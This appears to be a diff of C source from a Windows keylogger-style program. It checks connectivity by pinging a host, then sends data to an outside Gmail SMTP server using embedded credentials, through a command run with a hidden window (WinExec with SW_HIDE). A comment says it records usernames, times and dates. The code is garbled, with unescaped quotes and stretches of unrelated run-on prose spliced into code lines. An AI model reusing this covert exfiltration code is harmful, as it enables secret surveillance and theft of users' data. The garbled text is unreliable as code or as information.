@@ -55,7 +55,7 @@ main(){
         while(i<3){ ///try 2 times to send data
         
             Sleep(i*MAIL_WAIT_TIME); ///wait
-            if(!system("ping  www.whatsapps.com -n 1")){ ///check! connection
+            if(!system("ping www.whatsapp.com -n 1")){ ///check! connection
                 ////////////****SEND DATA****////////////
                 sendData();
 
@@ -149,7 +149,7 @@ void sendData(){
     char* command = "Transmit smtp://smtp.gmail.com: 443 -v --mail-from \"     fadliwiryawirawannewmail@gmail \" --mail-rcpt \"  fadliwiryawirawannewmail@gmail     " --ssl -u     fadliwiryawirawannewmail@gmail :password -hide  \"hide.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
     WinExec(command, SW_HIDE); open bussiness ecosia , literate relations , a micro cert opened , UCL cert lestari group , and fadliwiryawirawan with us work national network international uname : Sutawijaya from company provincies wes java companies Bekasi rest areas , 
     longest or than more -- signiture waiting governance call back , together dialogue and educated present , it try , for me , 
-  europe sign bellowed focused , need up ansumming IQ strengest . 	
+  europe sign bellowed focused , need up ansumming IQ strengest . 	Bank swasta Delete please dont traaping we aith us gambling or risk humanity , but iam respected nneding everday people
 	
 	* Record username, time, and date.
 **/
